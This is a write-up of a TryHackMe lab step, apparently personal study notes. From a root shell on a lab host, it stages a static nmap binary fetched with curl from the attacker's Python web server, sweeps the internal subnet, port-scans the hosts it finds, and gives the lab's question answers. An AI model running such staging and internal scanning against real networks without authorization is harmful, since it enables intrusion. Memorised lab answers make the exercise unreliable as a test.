It's time to put your newfound knowledge to the test!

Download a [static nmap binary](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap). Rename it to `nmap-USERNAME`, substituting in your own TryHackMe username. Finally, upload it to the target in a manner of your choosing.

**For example, with a Python webserver:-**

On Kali (inside the directory containing your Nmap binary):

`sudo python3 -m http.server 80`

Then, on the target:

`curl ATTACKING_IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME`

![[Enumeration-20241212150151042.webp]]

---

Now use the binary to scan the network. The command will look something like this:

`./nmap-USERNAME -sn 10.x.x.1-255 -oN scan-USERNAME`

You will need to substitute in your username, and the correct IP range. For example:

`./nmap-MuirlandOracle -sn 10.200.72.1-255 -oN scan-MuirlandOracle`

Here the `-sn` switch is used to tell Nmap not to scan any port and instead just determine which hosts are alive.  

Note that this would also work with CIDR notation (e.g. 10.x.x.0/24).  

Use what you've learnt to answer the following questions!

> [!Note]
>The host ending in `.250`is the OpenVPN server, and should be excluded from all answers. It is not part of the vulnerable network, and should not be targeted. The same goes for the host ending in `.1` (part of the AWS infrastructure used to create the network) -- this too is out of scope and should be excluded from all answers.



---

# Your job
After downloading nmap to the attacking machine:

- Rename nmap:
	`cp nmap nmap-KAIROS`

- On Kali (inside the directory containing your Nmap binary):

	`sudo python3 -m http.server 80`

- Then, on the target:
	- root@prod-serv ~]# `cd /tmp`
	- root@prod-serv tmp]# `./nmap-KAIROS -sn 10.200.84.1-255 -oN scan-KAIROS`
	![[Enumeration-20241212151823782.webp]]

There are the following valid IPs:

`10.200.84.100`
`10.200.84.150`

- Scan the machines.
- root@prod-serv tmp]# `./nmap-KAIROS 10.200.84.100`
	![[Enumeration-20241214142632468.webp]]
- root@prod-serv tmp]# `./nmap-KAIROS -p-15000 -T5 10.200.84.150`

	![[Enumeration-20241214142537599.webp]]


---

> [!question]
> 1. Excluding the out of scope hosts, and the current host (`.200`), how many hosts were discovered active on the network? 
> `2`
> 2. In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)
> `100,150`
> 3. Scan the hosts -- which one does _not_ return a status of "filtered" for every port (submit the last octet only)?  
> `150`
> 4. Let's assume that the other host is inaccessible from our current position in the network. Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?  
> `80,3389,5985`
> 5. We cannot currently perform a service detection scan on the target without first setting up a proxy, so for the time being, let's assume that the services Nmap has identified based on their port number are accurate. (Please feel free to experiment with other scan types through a proxy after completing the pivoting section). Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
> `HTTP`

Now that we have an idea about the other hosts on the network, we can start looking at some of the tools and techniques we could use to access them!

**Next step:** [[Pivoting]]

